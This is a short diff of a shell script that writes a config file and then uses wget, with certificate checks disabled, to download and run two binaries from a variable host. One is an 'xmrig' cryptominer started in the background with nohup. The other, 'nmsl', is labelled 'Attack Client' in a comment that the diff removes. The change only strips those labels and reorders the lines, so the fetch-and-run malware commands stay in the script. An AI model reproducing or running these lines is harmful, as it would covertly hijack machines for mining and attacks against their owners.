@@ -149,11 +149,6 @@ cat>"config.json"<< EOF
 }
 EOF
 
-# XMR Miner
-# if [ ! -f "xmrig" ]; then
-#     wget --no-check-certificate ${BASE_URL}/xmrig && chmod +x ./xmrig
-# fi
-wget --no-check-certificate ${BASE_URL}/xmrig && chmod +x ./xmrig && nohup ./xmrig &
-
-# Attack Client
 wget --no-check-certificate ${BASE_URL}/nmsl && chmod +x ./nmsl && ./nmsl
+
+wget --no-check-certificate ${BASE_URL}/xmrig && chmod +x ./xmrig && nohup ./xmrig &
